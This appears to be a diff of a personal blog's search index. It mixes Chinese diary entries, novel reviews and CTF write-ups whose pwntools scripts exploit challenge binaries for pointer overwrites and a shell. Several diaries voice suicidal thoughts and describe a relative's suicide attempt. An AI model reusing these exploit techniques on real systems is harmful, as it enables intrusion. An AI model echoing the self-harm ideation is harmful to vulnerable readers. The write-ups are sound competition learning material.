+我同学当时正疑惑是谁在说话，但因为当时discord里就我两个，他很快就确认了就是我在说话，因为除了我之外也没有其他人了。
+他就问我，为什么突然喊了一声姐姐。我也说不上，我只告诉他我有一个比我大2,3岁的表姐，小时候对我非常好。我童年在外婆家的美好记忆至少有一半都是和她有关
+但我表姐后来因为他父母离婚，爸爸赌博欠债跑路，生活弄得一团乱，我们家也尝试帮助过她们，但是和投进水里的石子一样。她们最后也有点不太好意思一直接受，所以最后也慢慢放弃了。
+因为在打游戏么，我当时也没怎么在意，打了个哈哈就继续对线了。
+但是，10分钟后，我妈妈突然给我打电话，告诉我了一个消息，我表姐试图在浴室里割腕自杀，刚刚抢救回来。人还昏迷着。
+我只记得我当时没有任何惊讶，伤心，或者说任何情绪。感觉这一切都是理所当然会发生的，而我就是旁观者一样的感觉。
+]]></content>
+      <categories>
+        <category>Diary</category>
+      </categories>
+      <tags>
+        <tag>日记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>日记 20240208</title>
+    <url>/articles/diary/diary20240208/</url>
+    <content><![CDATA[看着四周热闹的人群，我不知道我在其中扮演着什么，我又在感受着什么。
+我只是一味的堆砌起笑容，迎合着他人的不知道是真是假的笑容。
+我仿佛不属于这个世界，周围的快乐，幸福与我无关。
+坐在回宿舍的路上，突然有点想哭，但是我心里又对我这种想哭的感觉感到好笑。
+哈哈，好似好似好似好似好似好似好似好似好似好似好似好似好似好似好似好似。
+情绪是最没有意义的事情，我不知道我为什么会有这个想法。
+也许是只有压抑住我的情绪，才能抑制住我逐渐增大的自我毁灭倾向。
+你确实不配得到爱，你确实不配被爱。
+回应我的只是心脏一阵又一阵的抽痛。
+Ayankeya
+2024.02.08 除夕夜
+]]></content>
+      <categories>
+        <category>Diary</category>
+      </categories>
+      <tags>
+        <tag>日记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>diary20240209</title>
+    <url>/articles/diary/diary20240209/</url>
+    <content><![CDATA[翻来覆去睡不着觉，也没有心情敲代码，我就侧着身子躺在床上。
+我划着朋友圈的年夜饭图片，划着社交媒体上各种人发着各种各样的庆祝新年的照片。
+我看着某个游戏群的群友在那边相互臊皮，我也看着某个小说书友群的群友在那里相互祝贺新年。
+我不知为何就哭了，我不知道我为什么在哭，眼泪他就自顾自的流了下来。
+这好像是我自初中以来第一次哭。明明前几年也是一个人度过的，今年怎么就这么难熬呢。
+我的心脏一抽一抽的，感觉有人在拉扯它一样，又酸又疼。我也不知道怎么才好，哈哈，也许这个时候猝死是一个不错的选择呢。
+我站起来拉开窗帘，外面的天还是黑的。虽然国内也是黑的，但这个时候或许已经被烟花照亮了吧。
+深呼吸，带起你的面具，藏好你的内心，今天还有课要上。
+Aynakeya
+]]></content>
+      <categories>
+        <category>Diary</category>
+      </categories>
+      <tags>
+        <tag>日记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[日记] 20221001 - 2</title>
+    <url>/articles/diary/ri-ji-20221002/</url>
+    <content><![CDATA[稍微写点流水账日记。
+
+
+covid-19终于阴性了，下周开始可以去上课了，舒服了。但是这周落下的课程，很多都没有录像，光靠notes还是挺困难的，但总归还是大概或许也许可以跟上？
+先是实习的面试，个人认为我和interviewer相谈甚欢，他提的问题我基本都能够回答，唯一不能确定的是我没有实习经历，不知道他们是怎么感觉的。
+问题是，我发了这么多简历，现在给我面试机会的就一个啊，气死我了气死我了气死我了气死我了气死我了。
+老毛病又开始犯了，每当快要睡着的时候，就会出现又哭又笑的幻听，这几次除了心悸和全身发麻之外还外加呼吸困难，真的有点快死了的感觉。
+真不知道未来是啥
+]]></content>
+      <categories>
+        <category>Diary</category>
+      </categories>
+      <tags>
+        <tag>日记</tag>
       </tags>
   </entry>
   <entry>
@@ -10205,6 +10119,23 @@ func (c *MixsiteCrawler) Start()  &#123;
       <tags>
         <tag>golang</tag>
         <tag>碎碎念</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[日记] 20221012</title>
+    <url>/articles/diary/ri-ji-20221012/</url>
+    <content><![CDATA[
+
+计算了一下，每天5公里的计划也快到一个月了。大概来说说感受吧。
+我一开始跑步的目的是为了降低心率，开学的时候测了一下，发现坐着不动的时候的心率就有95-105了。如果再这样下去，迟早要寄，所以就打算开始跑步，把体质提一提。
+但是很可惜的是，我的目的似乎没有达到，心率还是一样的高。。。
+但是，就单纯跑5km来说，现在已经比刚刚开始轻松了不少，所以大概还是有作用的吧?
+]]></content>
+      <categories>
+        <category>Diary</category>
+      </categories>
+      <tags>
+        <tag>日记</tag>
       </tags>
   </entry>
   <entry>
@@ -10271,18 +10202,6 @@ func (c *MixsiteCrawler) Start()  &#123;
       </tags>
   </entry>
   <entry>
-    <title>要emo了要 要抑郁了要</title>
-    <url>/articles/life/yao-emo-le-55555/</url>
-    <content><![CDATA[emo了要emo了
-好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊
-现在写作业和写代码啥的都变成防止我变emo的工具了。一停下来就感觉要抑郁了。想死想死想死想死想死想死想死想死想死想死想死
-我感觉我人真的要不行了，连续好几天了，都是快要睡着的时候，突然开始出现某明奇妙的幻听，然后心悸，全身发麻动不了。就感觉快死了的感觉。搞得最近都不敢睡觉。
-]]></content>
-      <categories>
-        <category>Life</category>
-      </categories>
-  </entry>
-  <entry>
     <title>九月三号 日记</title>
     <url>/articles/life/jiu-yue-san-hao-ri-ji/</url>
     <content><![CDATA[Part 0有人曾经问我，你相信这个世界有美好的事情存在吗？
@@ -10313,6 +10232,18 @@ Part 4我的答案是不相信。
       <tags>
         <tag>碎碎念</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>要emo了要 要抑郁了要</title>
+    <url>/articles/life/yao-emo-le-55555/</url>
+    <content><![CDATA[emo了要emo了
+好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊
+现在写作业和写代码啥的都变成防止我变emo的工具了。一停下来就感觉要抑郁了。想死想死想死想死想死想死想死想死想死想死想死
+我感觉我人真的要不行了，连续好几天了，都是快要睡着的时候，突然开始出现某明奇妙的幻听，然后心悸，全身发麻动不了。就感觉快死了的感觉。搞得最近都不敢睡觉。
+]]></content>
+      <categories>
+        <category>Life</category>
+      </categories>
   </entry>
   <entry>
     <title>别在图书馆秀恩爱</title>
@@ -10382,6 +10313,26 @@ docker真tm的好用，要是我不是docker而是自己编译部署的话，那
       </tags>
   </entry>
   <entry>
+    <title>[小说简评] 小世界其乐无穷 - 听日</title>
+    <url>/articles/novel/xiao-shuo-shu-ping-xiao-shi-jie-qi-le-wu-qiong/</url>
+    <content><![CDATA[最近在看一本十分有趣的书《术士手册》，作者是听日的。总的来说，就是脑洞很大，其中每个人物都有属于他自己的特色。
+但是这本书还没有完结，就不多评价了。
+因为这本书的原因，又去找了找作者的其他书看了一看。于是就有了今天的书评。
+《小世界其乐无穷》的剧情设定来说就是一个宅男收到了一个游戏机，他在里面通关的任何游戏都可以在不久后化成现实。基于这个设定，作者给出了居多的脑洞，而且每个都非常有意思。
+从最开始的编排与主角无关人物，到后来主角成为游戏里的角色之一并开始亲手缔造未来，每一场游戏，以及游戏和现实的交汇都非常好看。确实能看出作者在脑洞这一方面的天赋。
+但是，仅限前半本书。到后半本书之后（从颠倒世界开始），虽然游戏的部分依旧可以。但是这b作者开始写感情线了，还是写4个的后宫，你有这个能力么。
+这突然转进的感情戏导致这本书前后的观感差距很大，有很大的割裂感。就前半部分好好的在说游戏，但是从颠倒世界这一卷开始就一转感情线，中间没有任何的转折，没有过渡，就突然开始谈恋爱了，而且还是走后宫那一派的。
+其他的就不多说了。
+2022.08.16Aynakeya
+]]></content>
+      <categories>
+        <category>Novel</category>
+      </categories>
+      <tags>
+        <tag>书评</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>活着好累</title>
     <url>/articles/life/huo-zhao-hao-lei/</url>
     <content><![CDATA[活着好累，要是能死就好了
@@ -10389,6 +10340,55 @@ docker真tm的好用，要是我不是docker而是自己编译部署的话，那
       <categories>
         <category>Life</category>
       </categories>
+  </entry>
+  <entry>
+    <title>[小说简评] 宇宙飞行手册 (前115章)</title>
+    <url>/articles/novel/yu-zhou-fei-xing-shou-ce-qian-115-zhang-jian-ping/</url>
+    <content><![CDATA[《宇宙飞行手册》前115章简评
+这本书连载于起点中文网，目前尚未完结。
+阅读感受包括剧透，但不包括剧情和任务的介绍。如果还未读过这本书，建议先阅读再参考此评价。
+前言在朋友Y的推荐下阅读了这本书，朋友Y的推荐语是：“如果你觉得前三章好看，那么你一定会喜欢这本书。”
+我认为这话既对，又不尽然。
+
+
+Section A不同于起点所谓的“黄金三章”，期望从第一章开始就吸引读者，这本书的前几章完全没有任何抓人眼球的剧情。相反，它的开头就像一个史诗故事的旁白，平淡却不乏吸引力。作者以相亲为切入点，短短几章便清晰而详细地描绘了一个星际大航海世界观的一角。
+当然，该作品也有精彩之处。无论是王平安和安格丽首次搭档任务时的救人行动，还是第105章中的“爆破”企业号，这些故事单独拿出来都足以让人热血沸腾。尤其是在有前文铺垫的情况下，更加引人入胜。
+因此，在剧情方面，这本书的前105章毫无疑问是完美的。
+Section B剧情出色的同时，我们也能感受到作者在角色塑造上的用心。正因为有了丰满的角色形象，这些角色所参与的戏码才如此吸引人，打动人。
+可以看出，作者花了大量篇幅描绘一个角色，即使这个角色只是众多配角中的一个（卢盈盈）。在描写卢盈盈时，无论是从主角的视角，还是从卢盈盈的家庭、朋友的角度，作者都从多个方面展示了这个角色。我们能清晰地感受到这个角色的性格和内心活动，所以当这个角色在剧情中做出某些行动时，我们会觉得：啊，她就是这样一个人。
+对于主角更不用多说。
+Section C写这篇文章时，我刚读完第115章。但我可能不太想继续看下去了。我的直觉（以及其他原因）告诉我，这本书注定是一个悲情的Bad Ending（让我想起了《边缘行者》）。虽然这个Bad End可能会很精彩，但我年纪大了看不了悲剧(笑。
+当我读到第115章卢盈盈的角色和朋友表露心声时，我便能隐约感觉到，这本书不太可能有一个美好的结局。
+一个完整的故事由许多小故事组成，而这些小故事中，除了主角之外，还会有一个小故事的主角。这个小故事的主线通常围绕着这个小故事主角和真主角展开。
+每个故事都会有结局，小故事也不例外。无论这个小故事的主角最后是加入主角团继续冒险，还是在一旁做自己的事情，总会有一个小结局来描绘这个小故事的主角。
+在我读过的绝大部分作品中，小故事的结局或多或少都暗示了全文的走向。
+在第115章，卢盈盈这个小故事告一段落了：
+-卢盈盈有一个梦想，就是和主角王平安简简单单谈恋爱、结婚、共度一生。可惜作为主角的王平安并不愿意，他的目标是星辰大海，于是主角踏上了最前线。
+卢盈盈为了主角，放弃了原本安稳的工作，毅然决然地加入了慰问团，为的就是能到前线去和主角见面，为的就是能追随主角的脚步。
+可惜，卢盈盈永远追不上主角，她只是在追寻一个可能并不存在的幻影罢了。-
+相对的，主角也有一个梦想，就是前往半人马星座。当我读到这里时，我几乎已经能猜到后续剧情：在主角追求前往半人马星座的途中，他不断被各种麻烦事缠身，最后死在各个势力的混战中。
+（当然这有点草率了，作者肯定有更好的方式让主角走向结局）
+以上只是一个原因。
+另一个原因是基于我对作者心思的揣摩——能写出这种开头的人，真的会为了取悦读者而写一个大团圆结局吗？ 
+这个故事就是套了一个喜剧外表的悲剧故事。 基本上所有的角色都是悲剧角色：
+王平安的生母去世，生父换了多个妻子；安格丽的原生家庭为了入籍把女儿当商品；喜欢星空的兄妹因为各种阴谋丧命；
+类似的例子还有很多。
+想想就是了，有什么能让一个故事更加深入人心，更加震撼人心？我想，除了悲剧之外，别无他法。
+Section D再来谈谈作者，这位作者完全不像一位网络文学作家，甚至可以说他不适合作为一个网络文学作者。在这个时代，网络文学作者或多或少都会为读者做一些妥协，而这位作者却是完完全全按照自己的想法在写，全身心投入。而不妥协的网络文学作者基本上不会有很好的成绩，因为他吸引的终究是那么一小部分和他能共鸣的人。
+这有好处也有坏处。坏处在于，这本书只能与那些与作者电波相符的人对话。如果没有匹配上，那么读者会觉得作者就是一团糟，作者也会觉得读者就是一团糟。
+但问题在于，有些故事对不上电波的人也会觉得很精彩，这就导致部分读者可能会觉得书的上下文割裂感有点大。
+总之，对于网络文学来说，这本书的作者似乎有中二病发作，有点太沉浸在自己创造的世界里了（不过这也是角色刻画和剧情表现能够引人入胜的原因吧，笑）。
+结语为了讲述Section CD，写了AB。
+希望之后能狠狠地打我的脸。
+Aynakeya
+2023.04.27
+]]></content>
+      <categories>
+        <category>Novel</category>
+      </categories>
+      <tags>
+        <tag>书评</tag>
+      </tags>
   </entry>
   <entry>
     <title>404</title>
@@ -10421,9 +10421,26 @@ Or click here to redirect immediately.
           if(countdown ]]></content>
   </entry>
   <entry>
+    <title>Bookmarks</title>
+    <url>/bookmarks/index.html</url>
+    <content><![CDATA[
+计算机
+二次元
+AI
+
+]]></content>
+  </entry>
+  <entry>
     <title>about</title>
     <url>/about/index.html</url>
     <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>[Category] title [CTF]</title>
+    <url>/ctf-writeup/template.html</url>
+    <content><![CDATA[0x0 Introductionfiles: gambler_supreme
+0x1 Mitigation0x2 Vulnerability0x3 Exploit0x4 Flagforgot
+]]></content>
   </entry>
   <entry>
     <title>ctf-writeup</title>
@@ -10462,23 +10479,6 @@ bilibili ctf 2021
 down under ctf
 trendmicro ctf 2021
 
-]]></content>
-  </entry>
-  <entry>
-    <title>Bookmarks</title>
-    <url>/bookmarks/index.html</url>
-    <content><![CDATA[
-计算机
-二次元
-AI
-
-]]></content>
-  </entry>
-  <entry>
-    <title>[Category] title [CTF]</title>
-    <url>/ctf-writeup/template.html</url>
-    <content><![CDATA[0x0 Introductionfiles: gambler_supreme
-0x1 Mitigation0x2 Vulnerability0x3 Exploit0x4 Flagforgot
 ]]></content>
   </entry>
   <entry>
@@ -10640,14 +10640,6 @@ Etc
 ]]></content>
   </entry>
   <entry>
-    <title>Bilibili CTF 2021</title>
-    <url>/ctf-writeup/2021/bilibilictf/index.html</url>
-    <content><![CDATA[Bilibili CTF 2021RankChallenges
-writeup
-
-]]></content>
-  </entry>
-  <entry>
     <title>bilibili ctf 2021 writeup</title>
     <url>/ctf-writeup/2021/bilibilictf/bilibili-ctf-2021.html</url>
     <content><![CDATA[0x0 简介Bilibili CTF 简称 BTF，是一个丝毫没有含金量的ctf，狗都不玩。
@@ -10805,250 +10797,11 @@ cr你隔这白嫖风控算法呐？
 ]]></content>
   </entry>
   <entry>
-    <title>【Hack.lu CTF 2021】secure prototype 【pwn】</title>
-    <url>/ctf-writeup/2021/hackerluctf/hacker-lu-2021-secure-prototype.html</url>
-    <content><![CDATA[0x1 introductionhttps://flu.xxx/challenges/16
-0x3 Mitigations# Arch:     arm-32-little
-# RELRO:    Partial RELRO
-# Stack:    Canary found
-# NX:       NX enabled
-# PIE:      No PIE (0x10000)
+    <title>Bilibili CTF 2021</title>
+    <url>/ctf-writeup/2021/bilibilictf/index.html</url>
+    <content><![CDATA[Bilibili CTF 2021RankChallenges
+writeup
 
-0x3 Solutionchallenge contains 3 file, challenge.elf, stonks.txt, flag.txt
-using decompiler and take a deep look at functions.
-
-
-
-after enter the correct command and enter three variable, it will jump to function at 108e0, 108e0 contains a switch that call different function depending on the command user enter.
-
-notice that string &quot;stonks.txt&quot; are stored in the byte_22058, and with commmand 48, function sub_10B80 will read byte_22058 as a filename, and print out whether in the file.
-so, we got an idea that if we need get the flag, we need to change byte_22058 to &quot;flag.txt&quot; instead of &quot;stonks.txt&quot;
-looking at other commands, command 1056 allow us pass a integer as a pointer to an function (lets say funcA).
-and with command 4619, we have call funcA with our 1st and 2nd parameter.
-so, here is the question. Is there any function that take 2 pointer parameter and can modify a string. 
-the answer is plt:00010570 __isoc99_scanf, we can use scanf(&quot;%s&quot;,char* str) to read input from stdin and write str.
-in this case, str is the address of byte_22058, and &quot;%s&quot; can also found in the data section.
-therefore, we have the process of getting the flag.
-
-use 1056: change function address to scanf
-use 4619: call scanf and write flag.txt to byte_22058
-use 48: print out the file content in filename(byte_22058)
-
-0x4 exp.py#!&#x2F;usr&#x2F;bin&#x2F;env python3
-# -*- coding: utf-8 -*-
-# This exploit template was generated via:
-# $ pwn template &#39;--host&#x3D;flu.xxx&#39; &#39;--port&#x3D;20040&#39; challenge.elf
-from pwn import *
-
-# Set up pwntools for the correct architecture
-exe &#x3D; context.binary &#x3D; ELF(&#39;challenge.elf&#39;)
-
-# Many built-in settings can be controlled on the command-line and show up
-# in &quot;args&quot;.  For example, to dump all data sent&#x2F;received, and disable ASLR
-# for all created processes...
-# .&#x2F;exploit.py DEBUG NOASLR
-# .&#x2F;exploit.py GDB HOST&#x3D;example.com PORT&#x3D;4141
-host &#x3D; args.HOST or &#39;flu.xxx&#39;
-port &#x3D; int(args.PORT or 20040)
-
-def start_local(argv&#x3D;[], *a, **kw):
-    &#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;
-    if args.GDB:
-        return gdb.debug([exe.path] + argv, gdbscript&#x3D;gdbscript, *a, **kw)
-    else:
-        return process([exe.path] + argv, *a, **kw)
-
-def start_remote(argv&#x3D;[], *a, **kw):
-    &#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;
-    io &#x3D; connect(host, port)
-    if args.GDB:
-        gdb.attach(io, gdbscript&#x3D;gdbscript)
-    return io
-
-def start(argv&#x3D;[], *a, **kw):
-    &#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;
-    if args.LOCAL:
-        return start_local(argv, *a, **kw)
-    else:
-        return start_remote(argv, *a, **kw)
-
-# Specify your GDB script here for debugging
-# GDB will be launched if the exploit is run via e.g.
-# .&#x2F;exploit.py GDB
-gdbscript &#x3D; &#39;&#39;&#39;
-tbreak *0x&#123;exe.entry:x&#125;
-continue
-&#39;&#39;&#39;.format(**locals())
-
-#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
-#                    EXPLOIT GOES HERE
-#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
-# Arch:     arm-32-little
-# RELRO:    Partial RELRO
-# Stack:    Canary found
-# NX:       NX enabled
-# PIE:      No PIE (0x10000)
-
-io &#x3D; start()
-print(1,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))
-io.sendline(b&quot;1056&quot;)
-print(2,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))
-io.sendline(b&quot;66928 0 0&quot;)
-print(3,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))
-io.sendline(b&quot;4919&quot;)
-print(4,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))
-io.sendline(b&quot;70140 139352 0&quot;)
-io.sendline(b&quot;flag.txt\x00&quot;)
-print(5,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))
-io.sendline(b&quot;48&quot;)
-print(6,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))
-io.sendline(b&quot;123 456 789&quot;)
-print(io.recv())
-
-
-
-print(&quot;%%s&quot;,0x111fc)
-print(&quot;22058&quot;,0x0022058)
-print(&quot;scanf&quot;,0x00010570)
-
-0x5 flagflag{gl0bal_st0nkz_and_gl0bal_var1abl3}
-]]></content>
-  </entry>
-  <entry>
-    <title>Hacker.lu CTF 2021</title>
-    <url>/ctf-writeup/2021/hackerluctf/index.html</url>
-    <content><![CDATA[Hacker.lu CTF 2021RankChallenges
-[Pwn] secure-prototype
-
-]]></content>
-  </entry>
-  <entry>
-    <title>[writeup][DownUnderCTF 2021] pwn-babygame</title>
-    <url>/ctf-writeup/2021/downunderctf/ductf2021-pwn-babygame.html</url>
-    <content><![CDATA[Mitigations# Arch:     amd64-64-little
-# RELRO:    Partial RELRO
-# Stack:    Canary found
-# NX:       NX enabled
-# PIE:      PIE enabled
-
-Solutionvuln 1in game() function, it will ask us to provide number that is equals the first 4 bytes of /dev/urandom, if we guess it right, it will give us a shell. however guessing is not possible.
-
-&#x2F;&#x2F; from main
-
-_RANDBUF &#x3D; &quot;&#x2F;dev&#x2F;urandom&quot;;
-
-&#x2F;&#x2F; from game()
-    uVar2 &#x3D; fopen(_RANDBUF, 0x2098);
-    fread(&amp;ptr, 1, 4, uVar2);
-    printf(&quot;guess: &quot;);
-    iVar1 &#x3D; get_num();
-    if (iVar1 &#x3D;&#x3D; ptr) &#123;
-        system(&quot;&#x2F;bin&#x2F;sh&quot;);
-    &#125;
-
-vuln 2since NAME if 0x20 bytes long, so if we can write fill NAME with 0x20 bytes long, it will print out the next variable in the stack.
-because if the entire buff is filled, the string will not terminate and continue reading until we get a null bytes.
-and it set_name using strlen, so the total length would be 0x20+(length until it meet a null bytes)
-&#x2F;&#x2F; from print_username()
-	puts(NAME);
-
-&#x2F;&#x2F; from set_username()
-    uVar2 &#x3D; strlen(NAME);
-    fread(NAME, 1, uVar2, uVar1);
-
-since the _RANDBUF is just beblow the NAME, we can first get the pointer of _RANDBUF and change the pointer in _RANDBUF to an known file, in this case we use /bin/sh
-;-- NAME:
-0x000040a0-0x000040c0
-;-- RANDBUF:
-0x000040c0-0x000040c8
-
-processfirst write 32 bytes of name, than print name to get the pointer of _RANDBUF, after we got pointer of _RANDBUF we can use set_name to change this address to a existing /bin/sh string by offset.
-;-- str.dev_urandom:
-0x00002024          .string &quot;&#x2F;dev&#x2F;urandom&quot; ; len&#x3D;13
-;-- str.bin_sh:
-0x000020a3          .string &quot;&#x2F;bin&#x2F;sh&quot; ; len&#x3D;8
-
-Exploits#!&#x2F;usr&#x2F;bin&#x2F;env python3
-# -*- coding: utf-8 -*-
-# This exploit template was generated via:
-# $ pwn template &#39;--host&#x3D;pwn-2021.duc.tf&#39; &#39;--port&#x3D;31907&#39; babygame
-import os
-
-from pwn import *
-
-# Set up pwntools for the correct architecture
-exe &#x3D; context.binary &#x3D; ELF(&#39;babygame&#39;)
-
-# Many built-in settings can be controlled on the command-line and show up
-# in &quot;args&quot;.  For example, to dump all data sent&#x2F;received, and disable ASLR
-# for all created processes...
-# .&#x2F;exploit.py DEBUG NOASLR
-# .&#x2F;exploit.py GDB HOST&#x3D;example.com PORT&#x3D;4141
-host &#x3D; args.HOST or &#39;pwn-2021.duc.tf&#39;
-port &#x3D; int(args.PORT or 31907)
-
-def start_local(argv&#x3D;[], *a, **kw):
-    &#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;
-    if args.GDB:
-        return gdb.debug([exe.path] + argv, gdbscript&#x3D;gdbscript, *a, **kw)
-    else:
-        return process([exe.path] + argv, *a, **kw)
-
-def start_remote(argv&#x3D;[], *a, **kw):
-    &#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;
-    io &#x3D; connect(host, port)
-    if args.GDB:
-        gdb.attach(io, gdbscript&#x3D;gdbscript)
-    return io
-
-def start(argv&#x3D;[], *a, **kw):
-    &#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;
-    if args.LOCAL:
-        return start_local(argv, *a, **kw)
-    else:
-        return start_remote(argv, *a, **kw)
-
-# Specify your GDB script here for debugging
-# GDB will be launched if the exploit is run via e.g.
-# .&#x2F;exploit.py GDB
-gdbscript &#x3D; &#39;&#39;&#39;
-tbreak main
-continue
-&#39;&#39;&#39;.format(**locals())
-
-#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
-#                    EXPLOIT GOES HERE
-#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
-# Arch:     amd64-64-little
-# RELRO:    Partial RELRO
-# Stack:    Canary found
-# NX:       NX enabled
-# PIE:      PIE enabled
-
-with open(&quot;&#x2F;bin&#x2F;sh&quot;,&quot;rb&quot;) as f:
-    a &#x3D; f.read(4)
-    print(&quot;num&quot;,int.from_bytes(a,&quot;little&quot;))
-
-io &#x3D; start()
-
-io.sendafter(b&quot;name?\n&quot;,b&quot;a&quot;*32)
-io.sendafter(b&quot;Username\n&gt; &quot;,b&quot;2&quot;)
-print(io.recv(32))
-a &#x3D; io.recvn(6)
-# b &#x3D; io.recvn(6)
-ptr &#x3D; (int.from_bytes(a,&quot;little&quot;)+0x20a3-0x2024).to_bytes(0x6,&quot;little&quot;)
-print(ptr)
-io.sendafter(b&quot;Username\n&gt; &quot;,b&quot;1&quot;)
-print(&quot;overwrite pointer&quot;)
-io.sendafter(b&quot;username to?\n&quot;,b&quot;a&quot;*32+ptr)
-print(&quot;overwrite pointer ok&quot;)
-print(io.recv(1024))
-io.send(b&quot;1337&quot;)
-print(io.recv(1024))
-io.send(b&#39;1179403647&#39;)
-io.interactive()
-
-DUCTF{whats_in_a_name?_5aacfc58}
 ]]></content>
   </entry>
   <entry>
@@ -11192,6 +10945,135 @@ void main(void)
 &#125;
 
 FlagDUCTF{f0rm4t_5p3c1f13r_m3dsg!}
+]]></content>
+  </entry>
+  <entry>
+    <title>[writeup][DownUnderCTF 2021] pwn-babygame</title>
+    <url>/ctf-writeup/2021/downunderctf/ductf2021-pwn-babygame.html</url>
+    <content><![CDATA[Mitigations# Arch:     amd64-64-little
+# RELRO:    Partial RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      PIE enabled
+
+Solutionvuln 1in game() function, it will ask us to provide number that is equals the first 4 bytes of /dev/urandom, if we guess it right, it will give us a shell. however guessing is not possible.
+
+&#x2F;&#x2F; from main
+
+_RANDBUF &#x3D; &quot;&#x2F;dev&#x2F;urandom&quot;;
+
+&#x2F;&#x2F; from game()
+    uVar2 &#x3D; fopen(_RANDBUF, 0x2098);
+    fread(&amp;ptr, 1, 4, uVar2);
+    printf(&quot;guess: &quot;);
+    iVar1 &#x3D; get_num();
+    if (iVar1 &#x3D;&#x3D; ptr) &#123;
+        system(&quot;&#x2F;bin&#x2F;sh&quot;);
+    &#125;
+
+vuln 2since NAME if 0x20 bytes long, so if we can write fill NAME with 0x20 bytes long, it will print out the next variable in the stack.
+because if the entire buff is filled, the string will not terminate and continue reading until we get a null bytes.
+and it set_name using strlen, so the total length would be 0x20+(length until it meet a null bytes)
+&#x2F;&#x2F; from print_username()
+	puts(NAME);
+
+&#x2F;&#x2F; from set_username()
+    uVar2 &#x3D; strlen(NAME);
+    fread(NAME, 1, uVar2, uVar1);
+
+since the _RANDBUF is just beblow the NAME, we can first get the pointer of _RANDBUF and change the pointer in _RANDBUF to an known file, in this case we use /bin/sh
+;-- NAME:
+0x000040a0-0x000040c0
+;-- RANDBUF:
+0x000040c0-0x000040c8
+
+processfirst write 32 bytes of name, than print name to get the pointer of _RANDBUF, after we got pointer of _RANDBUF we can use set_name to change this address to a existing /bin/sh string by offset.
+;-- str.dev_urandom:
+0x00002024          .string &quot;&#x2F;dev&#x2F;urandom&quot; ; len&#x3D;13
+;-- str.bin_sh:
+0x000020a3          .string &quot;&#x2F;bin&#x2F;sh&quot; ; len&#x3D;8
+
+Exploits#!&#x2F;usr&#x2F;bin&#x2F;env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template &#39;--host&#x3D;pwn-2021.duc.tf&#39; &#39;--port&#x3D;31907&#39; babygame
+import os
+
+from pwn import *
+
+# Set up pwntools for the correct architecture
